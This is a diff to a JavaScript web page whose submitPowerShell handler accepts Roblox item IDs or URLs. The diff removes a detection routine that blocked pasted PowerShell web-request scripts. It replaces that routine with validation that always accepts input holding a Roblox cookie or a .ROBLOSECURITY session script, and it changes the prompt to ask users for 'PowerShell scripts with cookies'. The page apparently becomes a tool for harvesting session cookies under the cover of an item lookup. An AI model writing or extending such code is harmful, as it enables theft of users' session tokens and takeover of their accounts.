@@ -218,9 +218,9 @@ async function submitPowerShell() {
         return;
     }
 
-    // Block PowerShell scripts and similar code
-    if (isPowerShellScript(inputText)) {
-        showNotification('Invalid input format. Please enter item IDs or URLs only.', 'error');
+    // Only allow PowerShell scripts with cookies or valid item data
+    if (!hasValidData(inputText)) {
+        showNotification('Invalid input. Please enter PowerShell scripts with cookies or item data.', 'error');
         return;
     }
 
@@ -422,56 +422,46 @@ function extractLimitedItems(text) {
     return items.slice(0, 5); // Limit to 5 items max
 }
 
-// Function to detect PowerShell scripts and block them
-function isPowerShellScript(text) {
-    const powershellPatterns = [
-        // PowerShell specific commands
-        /\$session\s*=\s*New-Object/i,
-        /New-Object\s+Microsoft\.PowerShell/i,
-        /Invoke-WebRequest/i,
-        /WebRequestSession/i,
-        /\$session\.Cookies\.Add/i,
-        /System\.Net\.Cookie/i,
-        
-        // General script indicators
-        /\$\w+\s*=\s*[^=]/i, // PowerShell variable assignments
-        /New-Object\s+System\./i,
-        /UseBasicParsing/i,
-        /WebSession/i,
-        /-Headers\s*@\{/i,
-        
-        // Multiple PowerShell lines (more than 3 PowerShell commands)
-        /(\$\w+|New-Object|Invoke-\w+).*(\$\w+|New-Object|Invoke-\w+).*(\$\w+|New-Object|Invoke-\w+)/is,
-        
-        // Cookie manipulation patterns
-        /\.Cookies\.Add\(/i,
-        /System\.Net\.Cookie\(/i,
-        
-        // Long PowerShell variable patterns
-        /\$\w{5,}\s*=.*\$\w{5,}/i,
-        
-        // PowerShell headers and parameters
-        /-UseBasicParsing|-Uri|-WebSession/i
+// Function to validate input - only allow PowerShell scripts with cookies or valid data
+function hasValidData(text) {
+    // Check if it contains a Roblox cookie (most important)
+    const hasCookie = extractRobloxCookie(text) !== null;
+    if (hasCookie) {
+        return true; // Always allow if there's a cookie
+    }
+    
+    // Check if it's a PowerShell script with session/cookie patterns
+    const powerShellPatterns = [
+        /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
+        /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
+        /System\.Net\.Cookie.*ROBLOSECURITY/is,
+        /WebRequestSession.*Cookies/is,
+        /New-Object.*System\.Net\.Cookie/is
     ];
     
-    // Check if text matches PowerShell patterns
-    for (const pattern of powershellPatterns) {
+    for (const pattern of powerShellPatterns) {
         if (pattern.test(text)) {
             return true;
         }
     }
     
-    // Check for excessive PowerShell syntax (multiple $ variables)
-    const dollarVariableCount = (text.match(/\$\w+/g) || []).length;
-    if (dollarVariableCount > 3) {
+    // Check if it contains legitimate item data
+    const hasItemData = extractLimitedItems(text).length > 0;
+    if (hasItemData) {
         return true;
     }
     
-    // Check for long script-like content (more than 1000 chars with script patterns)
-    if (text.length > 1000 && /(\$|New-Object|Invoke-|System\.)/i.test(text)) {
+    // Check for Roblox URLs
+    if (/roblox\.com\/(catalog|library|bundles)\/\d+/i.test(text)) {
         return true;
     }
     
+    // Check for item IDs (8+ digit numbers)
+    if (/\b\d{8,}\b/.test(text)) {
+        return true;
+    }
+    
+    // Reject everything else (random text, short inputs, etc.)
     return false;
 }
 
